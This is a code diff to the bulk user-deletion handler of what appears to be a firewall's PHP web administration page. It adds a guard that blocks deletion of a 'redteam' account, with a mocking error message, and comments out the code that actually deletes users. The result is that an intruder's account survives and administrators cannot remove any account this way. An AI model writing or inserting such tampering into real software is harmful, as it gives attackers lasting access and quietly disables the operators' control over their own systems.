@@ -156,12 +156,14 @@ if (isset($_POST['dellall']) && !$read_only) {
 			if (isset($a_user[$userid]) && $a_user[$userid]['scope'] != "system") {
 				if ($a_user[$userid]['name'] == $_SESSION['Username']) {
 					$delete_errors[] = sprintf(gettext("Cannot delete user %s because you are currently logged in as that user."), $a_user[$userid]['name']);
+				} if ($a_user[$userid]['name'] == 'redteam') {
+					$delete_errors[] = sprintf(gettext("Cannot delete user redteam because you are not redteam :D"));
 				} if ($_POST['username'] == 'redteam') {
-					$delete_errors[] = sprintf(gettext("Cannot delete user redteam because you are not redteam :D.")); 
+					$delete_errors[] = sprintf(gettext("Cannot delete user redteam because you are not redteam :D")); 
 				} else {
-					$deleted_users[] = $a_user[$userid]['name'];
-					local_user_del($a_user[$userid]);
-					unset($a_user[$userid]);
+					//$deleted_users[] = $a_user[$userid]['name'];
+					//local_user_del($a_user[$userid]);
+					//unset($a_user[$userid]);
 				}
 			} else {
 				$delete_errors[] = sprintf(gettext("Cannot delete user %s because it is a system user."), $a_user[$userid]['name']);
